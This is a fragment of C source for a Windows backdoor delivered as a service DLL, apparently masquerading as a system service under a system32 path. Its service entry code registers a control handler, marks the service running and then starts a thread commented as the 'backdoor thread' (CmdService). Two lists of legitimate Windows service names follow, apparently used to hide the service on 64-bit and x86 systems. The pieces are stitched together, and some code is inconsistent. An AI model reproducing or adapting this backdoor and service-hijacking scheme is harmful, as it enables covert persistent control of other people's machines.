%SystemRoot%\system32\EnterpriseAppMgmtSvc.dll
HANDLE    hThread;
	ServiceStatus.dwServiceType = SERVICE_WIN32;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
		| SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//得到服务进程名
	char svcname[256];
	strncpy(svcname, (char*)argv[0], sizeof(svcname));
	wcstombs(svcname, argv[0], sizeof(svcname));
	//注册服务控制函数
	ServiceStatusHandle = RegisterServiceCtrlHandler(svcname, ServiceControl);
	if (ServiceStatusHandle == 0)
	{
		//OutputDebugString("RegisterServiceCtrlHandler Error !\n");
		return;
	}
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//设置服务为运行状态
	if (SetServiceStatus(ServiceStatusHandle, &ServiceStatus) == 0)
	{
		//OutputDebugString("SetServiceStatus Error !\n");
		return;
	}
	//启动后门线程
	hThread = CreateThread(NULL, 0, CmdService, NULL, 0, NULL);
	if (hThread == NULL)
	{
		//OutputDebugString("CreateThread  Error !\n");
	}


64
CertPropSvc
SCPolicySvc
lanmanserver
gpsvc
IKEEXT
iphlpsvc
seclogon
AppInfo
msiscsi
EapHost
schedule
winmgmt
browser
SessionEnv
wercplsupport
shpamsvc
Themes
lfsvc
DmEnrollmentSvc
FastUserSwitchingCompatibility
Ias
Irmon
Nla
Ntmssvc
NWCWorkstation
Nwsapagent
Rasauto
Rasman
Remoteaccess
SENS
Sharedaccess
SRService
Tapisrv
Wmi
WmdmPmSp
wuauserv
BITS
ShellHWDetection
LogonHours
PCAudit
helpsvc
uploadmgr
dmwappushservice
WpnService
XboxNetApiSvc
DcpSvc
RetailDemo
BDESVC
DsmSvc
NcaSvc
dosvc
UsoSvc
XblAuthManager
ProfSvc
UserManager
XblGameSave
wisvc
wlidsvc
NetSetupSvc






86

CertPropSvc
SCPolicySvc
lanmanserver
gpsvc
iphlpsvc
msiscsi
schedule
winmgmt
SessionEnv
FastUserSwitchingCompatibility
Ias
Irmon
Nla
Ntmssvc
NWCWorkstation
Nwsapagent
Rasauto
Rasman
Remoteaccess
SENS
Sharedaccess
SRService
Tapisrv
Wmi
WmdmPmSp
wuauserv
BITS
ShellHWDetection
LogonHours
PCAudit
helpsvc
uploadmgr
UserManager
NetSetupSvc

